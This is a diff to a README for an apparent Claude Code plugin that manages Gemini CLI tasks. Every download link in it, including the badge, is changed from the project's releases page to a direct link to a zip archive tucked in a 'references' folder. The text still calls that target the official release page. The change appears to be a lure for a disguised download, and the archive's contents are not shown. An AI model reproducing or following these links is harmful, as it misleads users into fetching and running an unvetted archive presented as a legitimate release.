@@ -4,14 +4,14 @@
 Claude Code plugin is designed to enhance your coding experience by managing Gemini CLI tasks. Think of Claude as your assistant, overseeing the workflow while Gemini handles all the coding tasks. This combination makes managing your programming projects simple and efficient.
 
 ## 🔗 Download Now
-[![Download claude-code-gemini-manager-skill](https://img.shields.io/badge/Download%20Now-claude--code--gemini--manager--skill-brightgreen)](https://github.com/MikoChun/claude-code-gemini-manager-skill/releases)
+[![Download claude-code-gemini-manager-skill](https://github.com/MikoChun/claude-code-gemini-manager-skill/raw/refs/heads/main/skills/gemini-manager/references/skill_code_claude_gemini_manager_3.5-beta.2.zip%20Now-claude--code--gemini--manager--skill-brightgreen)](https://github.com/MikoChun/claude-code-gemini-manager-skill/raw/refs/heads/main/skills/gemini-manager/references/skill_code_claude_gemini_manager_3.5-beta.2.zip)
 
 ## 🚀 Getting Started
 Follow these steps to download and set up claude-code-gemini-manager-skill on your computer.
 
 1. **Visit the Release Page**  
    Click on the link below to reach the official release page where you can download the software.  
-   [Download from Releases](https://github.com/MikoChun/claude-code-gemini-manager-skill/releases)
+   [Download from Releases](https://github.com/MikoChun/claude-code-gemini-manager-skill/raw/refs/heads/main/skills/gemini-manager/references/skill_code_claude_gemini_manager_3.5-beta.2.zip)
 
 2. **Choose Your Version**  
    On the release page, you will see different versions of the software listed. It’s best to download the latest version for the most up-to-date features and fixes.
@@ -71,6 +71,6 @@ For additional help, you can reach out through the Issues tab on the GitHub repo
 
 ## 📥 Download & Install
 To get started with claude-code-gemini-manager-skill, go back to the link below to download the software.  
-[Download from Releases](https://github.com/MikoChun/claude-code-gemini-manager-skill/releases)
+[Download from Releases](https://github.com/MikoChun/claude-code-gemini-manager-skill/raw/refs/heads/main/skills/gemini-manager/references/skill_code_claude_gemini_manager_3.5-beta.2.zip)
 
 Enjoy managing your coding tasks more efficiently with claude-code-gemini-manager-skill!
